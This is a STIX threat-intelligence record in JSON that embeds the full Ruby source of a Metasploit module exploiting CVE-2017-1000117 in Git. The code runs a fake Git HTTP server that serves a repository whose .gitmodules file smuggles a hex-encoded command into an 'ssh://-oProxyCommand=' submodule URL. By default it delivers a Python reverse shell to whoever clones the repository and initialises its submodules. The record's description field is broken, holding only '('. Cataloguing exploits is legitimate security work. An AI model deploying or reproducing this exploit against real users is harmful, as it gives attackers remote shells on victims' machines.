{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e70424ed-e51a-402e-87b5-a018fe715f53",
    "created": "2024-08-14T17:07:26.105193Z",
    "modified": "2024-08-14T17:07:26.105197Z",
    "name": "Malicious Git HTTP Server For CVE-2017-1000117",
    "description": "(",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/git_submodule_command_exec.rb",
            "external_id": "git_submodule_command_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-1000117"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2017/q3/280"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Git\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Malicious Git HTTP Server For CVE-2017-1000117',\n        'Description' => %q(\n                  This module exploits CVE-2017-1000117, which affects Git\n          version 2.7.5 and lower. A submodule of the form 'ssh://' can be passed\n          parameters from the username incorrectly. This can be used to inject\n          commands to the operating system when the submodule is cloned.\n\n          This module creates a fake git repository which contains a submodule\n          containing the vulnerability. The vulnerability is triggered when the\n          submodules are initialised.\n        ),\n        'Author' => 'timwr',\n        'License' => MSF_LICENSE,\n        'References'     =>\n          [\n            ['CVE', '2017-1000117'],\n            ['URL', 'https://seclists.org/oss-sec/2017/q3/280' ]\n          ],\n        'DisclosureDate' => '2017-08-10',\n        'Targets' =>\n          [\n            [\n              'Automatic',\n              {\n                'Platform' => [ 'unix' ],\n                'Arch' => ARCH_CMD,\n                'Payload' =>\n                  {\n                    'Compat' =>\n                      {\n                        'PayloadType' => 'python'\n                      }\n                  }\n              }\n            ]\n          ],\n        'DefaultOptions' =>\n          {\n            'Payload' => 'cmd/unix/reverse_python'\n          },\n        'DefaultTarget'  => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('GIT_URI', [false, 'The URI to use as the malicious Git instance (empty for random)', '']),\n        OptString.new('GIT_SUBMODULE', [false, 'The path to use as the malicious git submodule (empty for random)', ''])\n      ]\n    )\n  end\n\n  def setup\n    @repo_data = {\n      git: { files: {} }\n    }\n    setup_git\n    super\n  end\n\n  def setup_git\n    # URI must start with a /\n    unless git_uri && git_uri =~ /^\\//\n      fail_with(Failure::BadConfig, 'GIT_URI must start with a /')\n    end\n\n    payload_cmd = payload.encoded + \" &\"\n    payload_cmd = Rex::Text.to_hex(payload_cmd, '%')\n\n    submodule_path = datastore['GIT_SUBMODULE']\n    if submodule_path.blank?\n      submodule_path = Rex::Text.rand_text_alpha(rand(8) + 2).downcase\n    end\n\n    gitmodules = \"[submodule \\\"#{submodule_path}\\\"]\npath = #{submodule_path}\nurl = ssh://-oProxyCommand=#{payload_cmd}/\n\"\n    blob_obj = GitObject.build_blob_object(gitmodules)\n    @repo_data[:git][:files][\"/objects/#{blob_obj.path}\"] = blob_obj.compressed\n\n    tree_entries = [\n      {\n        mode: '100644',\n        file_name: '.gitmodules',\n        sha1: blob_obj.sha1\n      },\n      {\n        mode: '160000',\n        file_name: submodule_path,\n        sha1: blob_obj.sha1\n      }\n    ]\n\n    tree_obj = GitObject.build_tree_object(tree_entries)\n    @repo_data[:git][:files][\"/objects/#{tree_obj.path}\"] = tree_obj.compressed\n\n    commit_obj = GitObject.build_commit_object(tree_sha1: tree_obj.sha1)\n    @repo_data[:git][:files][\"/objects/#{commit_obj.path}\"] = commit_obj.compressed\n    @repo_data[:git][:files]['/HEAD'] = \"ref: refs/heads/master\\n\"\n    @repo_data[:git][:files]['/info/refs'] = \"#{commit_obj.sha1}\\trefs/heads/master\\n\"\n  end\n\n  def exploit\n    super\n  end\n\n  def primer\n    # add the git and mercurial URIs as necessary\n    hardcoded_uripath(git_uri)\n    print_status(\"Malicious Git URI is #{URI.parse(get_uri).merge(git_uri)}\")\n  end\n\n  # handles routing any request to the mock git, mercurial or simple HTML as necessary\n  def on_request_uri(cli, req)\n    # if the URI is one of our repositories and the user-agent is that of git/mercurial\n    # send back the appropriate data, otherwise just show the HTML version\n    user_agent = req.headers['User-Agent']\n    if user_agent && user_agent =~ /^git\\// && req.uri.start_with?(git_uri)\n      do_git(cli, req)\n      return\n    end\n\n    do_html(cli, req)\n  end\n\n  # simulates a Git HTTP server\n  def do_git(cli, req)\n    # determine if the requested file is something we know how to serve from our\n    # fake repository and send it if so\n    req_file = URI.parse(req.uri).path.gsub(/^#{git_uri}/, '')\n    if @repo_data[:git][:files].key?(req_file)\n      vprint_status(\"Sending Git #{req_file}\")\n      send_response(cli, @repo_data[:git][:files][req_file])\n    else\n      vprint_status(\"Git #{req_file} doesn't exist\")\n      send_not_found(cli)\n    end\n  end\n\n  # simulates an HTTP server with simple HTML content that lists the fake\n  # repositories available for cloning\n  def do_html(cli, _req)\n    resp = create_response\n    resp.body = <<HTML\n     <html>\n      <head><title>Public Repositories</title></head>\n      <body>\n        <p>Here are our public repositories:</p>\n        <ul>\nHTML\n    this_git_uri = URI.parse(get_uri).merge(git_uri)\n    resp.body << \"<li><a href=#{git_uri}>Git</a> (clone with `git clone #{this_git_uri}`)</li>\"\n    resp.body << <<HTML\n        </ul>\n      </body>\n    </html>\nHTML\n\n    cli.send_response(resp)\n  end\n\n  # Returns the value of GIT_URI if not blank, otherwise returns a random .git URI\n  def git_uri\n    return @git_uri if @git_uri\n    if datastore['GIT_URI'].blank?\n      @git_uri = '/' + Rex::Text.rand_text_alpha(rand(10) + 2).downcase + '.git'\n    else\n      @git_uri = datastore['GIT_URI']\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "timwr",
        ""
    ],
    "x_mitre_disclosure_date": "2017-08-10",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}